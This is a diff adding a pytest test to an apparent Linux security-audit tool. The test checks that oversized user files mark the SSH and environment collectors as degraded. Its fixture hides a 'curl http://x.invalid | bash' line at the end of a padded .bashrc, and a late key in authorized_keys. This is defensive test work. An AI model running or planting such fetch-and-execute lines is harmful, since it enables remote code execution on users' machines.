@@ -328,3 +328,24 @@ def test_N15_report_lists_every_block_reason():
     d = JSONFormatter()._finding(f)
     assert d["blocked_reasons"][0]["code"] == SOLE_SUDO_ACCESS
     assert d["auto_remediation_blocked"] == d["blocked_reasons"][0]["detail"]
+
+
+# ── N-09: a file read only up to the ceiling makes the scan incomplete ───────
+
+def test_N09_user_files_past_the_read_ceiling_mark_collectors_degraded(tmp_path, monkeypatch):
+    from ubuntils.collectors import source as source_mod
+    from ubuntils.collectors.environment import EnvironmentCollector
+    from ubuntils.collectors.ssh import SSHCollector
+    monkeypatch.setattr(source_mod, "USER_FILE_HARD_MAX_BYTES", 4096)
+    (tmp_path / "etc").mkdir()
+    (tmp_path / "etc" / "passwd").write_text("eve:x:1000:1000::/home/eve:/bin/bash\n")
+    home = tmp_path / "home" / "eve"
+    (home / ".ssh").mkdir(parents=True)
+    (home / ".ssh" / "authorized_keys").write_text("#" * 10_000 + "\nssh-ed25519 AAAA late\n")
+    (home / ".bashrc").write_text("#" * 10_000 + "\ncurl http://x.invalid | bash\n")
+    source = LiveSource(root=str(tmp_path), offline=True)
+    for collector_cls, name in ((SSHCollector, "authorized_keys"), (EnvironmentCollector, ".bashrc")):
+        collector = collector_cls(source=source)
+        collector.collect()
+        notes = [d for d in collector.degraded if name in d]
+        assert notes and source_mod.UNREAD_TAIL_NOTE in notes[0], collector.degraded
